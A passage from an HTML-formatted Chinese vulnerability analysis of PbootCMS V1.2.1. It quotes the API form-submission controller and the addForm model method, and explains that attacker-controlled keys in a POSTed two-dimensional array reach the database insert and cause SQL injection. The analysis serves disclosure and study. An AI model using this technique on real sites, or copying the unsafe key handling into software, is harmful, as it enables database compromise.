&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$mail_body .= $value-&gt;description . &#39;</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">&#39; . post($value-&gt;name) . &#39;&lt;br&gt;&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">设置创建时间</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ($data) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$data[&#39;create_time&#39;] = get_datetime();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">写入数据</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ($this-&gt;model-&gt;addForm($value-&gt;table_name, $data)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;log(&#39;API</span><span class="cs7FFD2630">提交表单数据成功！</span><span class="cs9FB05234">&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ($this-&gt;config(&#39;message_send_mail&#39;) &amp;&amp; $this-&gt;config(&#39;message_send_to&#39;)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$mail_subject = &quot;</span><span class="cs7FFD2630">【</span><span class="cs9FB05234">PbootCMS</span><span class="cs7FFD2630">】您有新的表单数据，请注意查收！</span><span class="cs9FB05234">&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$mail_body .= &#39;&lt;br&gt;</span><span class="cs7FFD2630">来自网站</span><span class="cs9FB05234">&#39; . get_http_url() . &#39;</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">&#39; . date(&#39;Y-m-d H:i:s&#39;) . &#39;</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sendmail($this-&gt;config(), $this-&gt;config(&#39;message_send_to&#39;), $mail_subject, $mail_body);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;json(1, &#39;</span><span class="cs7FFD2630">表单提交成功！</span><span class="cs9FB05234">&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;log(&#39;API</span><span class="cs7FFD2630">提交表单数据失败！</span><span class="cs9FB05234">&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;json(0, &#39;</span><span class="cs7FFD2630">表单提交失败！</span><span class="cs9FB05234">&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;json(0, &#39;</span><span class="cs7FFD2630">表单提交失败，请使用</span><span class="cs9FB05234">POST</span><span class="cs7FFD2630">方式提交！</span><span class="cs9FB05234">&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">可以看到，整个逻辑下来的意思就是说，查询出数据库一条数据，然后接收外部</span><span class="cs8926E06"> POST </span><span class="cs9C1B1871">内容，只匹配数据库的字段，相同才会拼接到</span><span class="cs8926E06"> $_data</span><span class="cs9C1B1871">数组</span></p><p class="cs3A447A38"><span class="cs7FFD2630">然后就会带入</span><span class="cs9FB05234"> $this-&gt;model-&gt;addForm(data) </span><span class="cs7FFD2630">执行语句</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">文件：</span><span class="cs8926E06">PbootCMS-V1.2.1\apps\api\model\CmsModel.php </span><span class="cs9C1B1871">方法：</span><span class="cs8926E06">addForm(</span></p><p class="cs3A447A38"><span class="cs9FB05234">// </span><span class="cs7FFD2630">新增表单数据</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">public function addForm($table, $data)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return parent::table($table)-&gt;insert($data);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">根据</span><span class="cs8926E06">6.0</span><span class="cs9C1B1871">可以看到带入了进入了</span><span class="cs8926E06"> insert </span><span class="cs9C1B1871">那么我们传的二维数组刚好可以控制</span><span class="cs8926E06">key </span><span class="cs9C1B1871">带入数据库查询引发注入</span></p><h2 class="cs868C439D">
			<a name="四、参考链接"><span class="cs83F14626">四、参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06"><a class="cs508254C" href="https://www.yuque.com/pmiaowu/bfgkkh/lrqvqv"><span class="cs4B51D5E4">https://www.yuque.com/pmiaowu/bfgkkh/lrqvqv</span></a></span></p></body>
</html>
